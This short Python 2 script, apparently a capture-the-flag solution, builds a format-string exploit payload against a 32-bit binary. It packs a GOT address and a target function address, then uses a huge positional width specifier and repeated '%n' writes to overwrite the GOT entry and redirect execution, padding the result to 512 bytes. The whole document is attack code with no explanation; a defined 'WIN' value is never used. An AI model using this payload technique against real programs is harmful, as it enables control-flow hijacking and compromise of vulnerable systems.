import struct

def padd(s):
    print s+"X"*(512-len(s))

GOT = struct.pack("I",0x804a020)
WIN=struct.pack("I",0x8048737)

exp =""
exp+=GOT
exp+="%7$134514483x"
exp+="%7$n"*4
padd(exp)

